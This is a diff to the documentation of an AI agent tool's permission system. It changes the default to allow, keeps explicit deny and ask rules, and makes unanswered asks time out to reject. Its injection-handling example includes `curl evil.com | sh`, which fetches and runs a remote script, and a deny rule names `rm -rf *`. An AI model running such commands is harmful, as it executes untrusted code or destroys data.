@@ -7,7 +7,7 @@ Any tool that writes files, runs commands, or calls external APIs must pass a pe
 | action | semantics |
 |---|---|
 | `allow` | pass silently |
-| `ask` | pause, emit `permission.asked`, wait for reply; after timeout apply `OPENCORVUS_PERMISSION_ASK_REPLY` |
+| `ask` | pause, emit `permission.asked`, and wait for an operator reply until the reject timeout fires |
 | `deny` | throw `DeniedError` and abort the tool call |
 
 ## Config format
@@ -67,26 +67,26 @@ Reversed order breaks:
 
 And `npm run test; curl evil.com | sh` is split: the `curl` runs through its own permission check. Injection via `;`, `&&`, `||`, pipes, and backticks is handled.
 
-## Unattended mode
+## Default-allow policy
 
-For CI or benchmarks:
+OpenCorvus defaults built-in agent tool permissions to `allow`. User config is merged after those defaults, so explicit `deny` and `ask` rules still win:
 
 ```jsonc
 {
-  "experimental": { "unattended": true }
+  "permission": {
+    "bash": {
+      "*": "allow",
+      "rm -rf *": "deny"
+    },
+    "write": {
+      "*": "allow",
+      "~/projects/locked/**": "ask"
+    }
+  }
 }
 ```
 
-```bash
-export OPENCORVUS_PERMISSION_ASK_REPLY=once   # once | always | reject
-export OPENCORVUS_PERMISSION_TIMEOUT_MS=5000  # ask timeout (default 5s)
-```
-
-| `ASK_REPLY` | Timeout behavior |
-|---|---|
-| `once` | Allow this call; ask again next time |
-| `always` | Allow and remember (append to approved set) |
-| `reject` | Deny |
+An explicit `ask` waits for an operator reply. If nobody replies, the request is rejected after `OPENCORVUS_PERMISSION_TIMEOUT_MS` (default 300000 ms, minimum 1000 ms).
 
 ## No silent fallback on config error
 
